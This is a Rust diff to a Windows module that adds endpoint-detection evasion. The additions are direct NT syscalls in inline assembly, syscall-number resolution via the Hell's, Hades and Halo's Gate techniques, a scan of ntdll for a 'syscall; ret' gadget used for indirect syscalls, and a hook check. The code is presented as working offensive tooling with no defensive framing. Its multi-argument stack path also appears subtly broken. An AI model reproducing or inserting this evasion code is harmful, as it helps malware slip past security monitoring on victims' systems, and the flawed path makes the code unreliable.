@@ -240,14 +240,215 @@ pub mod windows {
 
     /// Execute a direct NT syscall with the given SSN and arguments.
     /// Uses inline assembly to bypass hooked ntdll.
+    /// Supports up to 8 arguments (first 4 in registers, rest on stack).
+    pub unsafe fn nt_syscall(ssn: u32, args: &[usize]) -> i32 {
+        let mut ret: i32;
+        match args.len() {
+            0 => std::arch::asm!(
+                "mov r10, rcx",
+                "mov eax, {ssn:e}",
+                "syscall",
+                ssn = in(reg) ssn,
+                lateout("rax") ret,
+                options(nostack),
+            ),
+            1 => std::arch::asm!(
+                "mov r10, rcx",
+                "mov eax, {ssn:e}",
+                "syscall",
+                ssn = in(reg) ssn,
+                in("rcx") args[0],
+                lateout("rax") ret,
+                options(nostack),
+            ),
+            2 => std::arch::asm!(
+                "mov r10, rcx",
+                "mov eax, {ssn:e}",
+                "syscall",
+                ssn = in(reg) ssn,
+                in("rcx") args[0],
+                in("rdx") args[1],
+                lateout("rax") ret,
+                options(nostack),
+            ),
+            3 => std::arch::asm!(
+                "mov r10, rcx",
+                "mov eax, {ssn:e}",
+                "syscall",
+                ssn = in(reg) ssn,
+                in("rcx") args[0],
+                in("rdx") args[1],
+                in("r8") args[2],
+                lateout("rax") ret,
+                options(nostack),
+            ),
+            4 => std::arch::asm!(
+                "mov r10, rcx",
+                "mov eax, {ssn:e}",
+                "syscall",
+                ssn = in(reg) ssn,
+                in("rcx") args[0],
+                in("rdx") args[1],
+                in("r8") args[2],
+                in("r9") args[3],
+                lateout("rax") ret,
+                options(nostack),
+            ),
+            n if n >= 5 => {
+                let a0 = args[0];
+                let a1 = args[1];
+                let a2 = args[2];
+                let a3 = args[3];
+                let mut extra = [0usize; 8];
+                for (i, &v) in args[4..].iter().enumerate() {
+                    extra[i] = v;
+                }
+                std::arch::asm!(
+                    "sub rsp, 0x48",
+                    "mov [rsp], {e0}",
+                    "mov [rsp+0x8], {e1}",
+                    "mov [rsp+0x10], {e2}",
+                    "mov [rsp+0x18], {e3}",
+                    "mov [rsp+0x20], {e4}",
+                    "mov [rsp+0x28], {e5}",
+                    "mov [rsp+0x30], {e6}",
+                    "mov [rsp+0x38], {e7}",
+                    "mov r10, rcx",
+                    "mov eax, {ssn:e}",
+                    "mov rcx, {a0}",
+                    "mov rdx, {a1}",
+                    "mov r8, {a2}",
+                    "mov r9, {a3}",
+                    "syscall",
+                    "add rsp, 0x48",
+                    ssn = in(reg) ssn,
+                    a0 = in(reg) a0,
+                    a1 = in(reg) a1,
+                    a2 = in(reg) a2,
+                    a3 = in(reg) a3,
+                    e0 = in(reg) extra[0],
+                    e1 = in(reg) extra[1],
+                    e2 = in(reg) extra[2],
+                    e3 = in(reg) extra[3],
+                    e4 = in(reg) extra[4],
+                    e5 = in(reg) extra[5],
+                    e6 = in(reg) extra[6],
+                    e7 = in(reg) extra[7],
+                    lateout("rax") ret,
+                    options(nostack),
+                );
+            }
+            _ => ret = -1,
+        }
+        ret
+    }
+
+    /// Resolve SSN from the LOADED ntdll in memory (Hades Gate).
+    /// Falls back to reading from memory via the hades_gate module.
+    pub fn resolve_ssn_from_memory(function_name: &str) -> Option<u32> {
+        crate::hades_gate::windows::hades_resolve_ssn(function_name)
+    }
+
+    /// Halo's Gate: resolve SSN even when the syscall stub is hooked.
+    ///
+    /// When an EDR hooks a syscall, the first bytes are patched (e.g. `JMP [addr]`).
+    /// Hell's Gate fails because the signature `4C 8B D1 B8` is broken.
+    /// Halo's Gate scans forward in the hooked area to find the real `0F 05`
+    /// (syscall instruction), then extracts the SSN from the `B8 [SSN]` before it.
+    ///
+    /// Algorithm:
+    ///   1. Read ntdll from disk (clean) to get the function's expected RVA
+    ///   2. Read the same address in memory (which may be hooked)
+    ///   3. Scan for `0f 05` syscall instruction within a 32-byte window
+    ///   4. The SSN is in the 4 bytes before the `B8` opcode preceding `0f 05`
+    pub fn resolve_ssn_halos_gate(function_name: &str) -> Option<u32> {
+        let ntdll_bytes = read_ntdll_from_disk()?;
+        let ntdll_base = parse_pe_image_base(&ntdll_bytes)?;
+        let exports = parse_pe_exports(&ntdll_bytes, ntdll_base)?;
+
+        let (_, func_rva) = exports.iter()
+            .find(|(name, _)| name.eq_ignore_ascii_case(function_name))?;
+
+        // Get the function address in the LOADED ntdll (may be hooked)
+        let loaded_ntdll_base = crate::hades_gate::windows::get_loaded_ntdll_base()?;
+        let func_addr = loaded_ntdll_base + *func_rva as usize;
+
+        unsafe {
+            let mem_bytes = std::slice::from_raw_parts(func_addr as *const u8, 32);
+
+            // Scan for `0f 05` syscall instruction
+            for i in 0..mem_bytes.len().saturating_sub(5) {
+                if mem_bytes[i] == 0x0F && mem_bytes[i + 1] == 0x05 {
+                    // Found syscall at offset i. The `mov eax, SSN` is B8 <SSN4>
+                    // Look backwards for B8 opcode (mov eax, imm32)
+                    let search_start = if i >= 6 { i - 6 } else { 0 };
+                    for j in (search_start..i).rev() {
+                        if mem_bytes[j] == 0xB8 && i - j >= 5 {
+                            let ssn = u32::from_le_bytes([
+                                mem_bytes[j + 1], mem_bytes[j + 2],
+                                mem_bytes[j + 3], mem_bytes[j + 4],
+                            ]);
+                            if ssn < 0x1000 {
+                                return Some(ssn);
+                            }
+                        }
+                    }
+                    // Also check right before syscall: B8 <SSN4> 0F 05
+                    if i >= 5 && mem_bytes[i - 5] == 0xB8 {
+                        let ssn = u32::from_le_bytes([
+                            mem_bytes[i - 4], mem_bytes[i - 3],
+                            mem_bytes[i - 2], mem_bytes[i - 1],
+                        ]);
+                        if ssn < 0x1000 {
+                            return Some(ssn);
+                        }
+                    }
+                }
+            }
+        }
+
+        None
+    }
+
+    /// Try all resolution methods: Hell's Gate → Hades Gate → Halo's Gate
+    pub fn resolve_ssn_any(function_name: &str) -> Option<u32> {
+        resolve_ssn(function_name)
+            .or_else(|| resolve_ssn_from_memory(function_name))
+            .or_else(|| resolve_ssn_halos_gate(function_name))
+    }
+
+    /// Indirect syscall: find a `syscall; ret` gadget in ntdll and jump to it.
+    ///
+    /// This bypasses EDRs that hook the `syscall` instruction itself.
+    /// Returns the address of a `syscall; ret` sequence in a loaded module.
+    pub fn find_syscall_ret_gadget() -> Option<usize> {
+        let ntdll_base = crate::hades_gate::windows::get_loaded_ntdll_base()?;
+
+        // Scan ntdll for `0f 05 c3` (syscall; ret) pattern
+        unsafe {
+            let mem = std::slice::from_raw_parts(ntdll_base as *const u8, 0x200000);
+
+            for i in 0..mem.len().saturating_sub(3) {
+                if mem[i] == 0x0F && mem[i+1] == 0x05 && mem[i+2] == 0xC3 {
+                    return Some(ntdll_base + i);
+                }
+            }
+        }
+
+        None
+    }
+
+    /// Execute an indirect syscall: sets up registers and jumps to a remote
+    /// `syscall; ret` gadget to avoid EDR hooks on the syscall instruction.
     #[inline(always)]
-    pub unsafe fn nt_syscall(ssn: u32, args: &[usize; 4]) -> i32 {
+    pub unsafe fn indirect_syscall(ssn: u32, args: &[usize; 4], gadget: usize) -> i32 {
         let mut ret: i32;
         std::arch::asm!(
             "mov r10, rcx",
             "mov eax, {ssn:e}",
-            "syscall",
+            "jmp {gadget}",
             ssn = in(reg) ssn,
+            gadget = in(reg) gadget,
             in("rcx") args[0],
             in("rdx") args[1],
             in("r8") args[2],
@@ -260,9 +461,34 @@ pub mod windows {
 
     /// Check if an NT function is hooked by comparing first bytes.
     pub fn is_ntdll_hooked(function_name: &str) -> bool {
+        let ntdll_bytes = match read_ntdll_from_disk() {
+            Some(b) => b,
+            None => return true,
+        };
+        let ntdll_base = match parse_pe_image_base(&ntdll_bytes) {
+            Some(b) => b,
+            None => return true,
+        };
+        let exports = match parse_pe_exports(&ntdll_bytes, ntdll_base) {
+            Some(e) => e,
+            None => return true,
+        };
+
+        if let Some((_, func_rva)) = exports.iter()
+            .find(|(name, _)| name.eq_ignore_ascii_case(function_name)) {
+            // Compare disk bytes vs memory bytes at the function address
+            if let Some(func_offset) = rva_to_offset(&ntdll_bytes, *func_rva) {
+                if let Some(loaded_base) = crate::hades_gate::windows::get_loaded_ntdll_base() {
+                    let disk_byte = ntdll_bytes.get(func_offset).copied().unwrap_or(0);
+                    let mem_byte = unsafe { *((loaded_base + *func_rva as usize) as *const u8) };
+                    return disk_byte != mem_byte;
+                }
+            }
+        }
+
         match resolve_ssn(function_name) {
-            Some(_) => false, // Successfully resolved = not hooked
-            None => true,     // Couldn't find = likely hooked
+            Some(_) => false,
+            None => true,
         }
     }
 
